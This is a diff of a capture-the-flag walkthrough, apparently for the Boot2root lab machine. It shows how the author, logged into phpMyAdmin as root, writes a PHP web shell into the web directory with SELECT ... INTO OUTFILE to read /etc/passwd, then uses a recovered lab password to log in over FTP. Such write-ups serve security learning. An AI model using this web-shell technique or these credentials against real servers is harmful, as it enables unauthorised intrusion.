@@ -62,10 +62,54 @@ root : Fg-'kKXBj87E:aJ$
 
 Now logged as root on the phpmyadmin page, we can test some SQL command.
 
-
 SELECT @ @version
 5.5.44-0ubuntu0.12.04.1
 
+Looking online on how to exploit Phpmyadmin as root user we found that we can call a SQL command to create a php file and 
+call shell_exec and execute some bash command and print the result in a file.
+source : https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/
 
+After few tries we found the right way to call it :
 
-select "<?php $output = shell_exec('cat /etc/passwd'); echo $output ?>" into outfile "/var/www/forum/templates_c/passwdd.php"
+select '<?php $output = shell_exec('cat /etc/passwd'); echo $output ?>' into outfile '/var/www/forum/templates_c/passwd.php'
+
+Then after sneaking around calling ls, pwd ...etc we found in the /home directory some subdirectories related to others users :
+
+LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
+
+In the LOOATME directory we can found a file called password and we have in it a login/password related to user lmezard:
+
+lmezard:G!@M6f4Eatau{sF"
+
+Of course these credidentials are not valid to log on Boot2root machine, it's a FTP account (we knew there was a ftp service
+running thanks to nmap).
+
+Login in FTP we could connect on the machine :
+
+ftp 192.168.56.103
+
+Going in to pass mode we can list the directory :
+
+tp 192.168.56.103
+Connected to 192.168.56.103.
+220 Welcome on this server
+Name (192.168.56.103:user42): lmezard
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+500 Illegal PORT command.
+ftp: bind: Address already in use
+ftp> pass
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode (192,168,56,103,46,195)
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp>
+
+And now we can get the README and fun files.
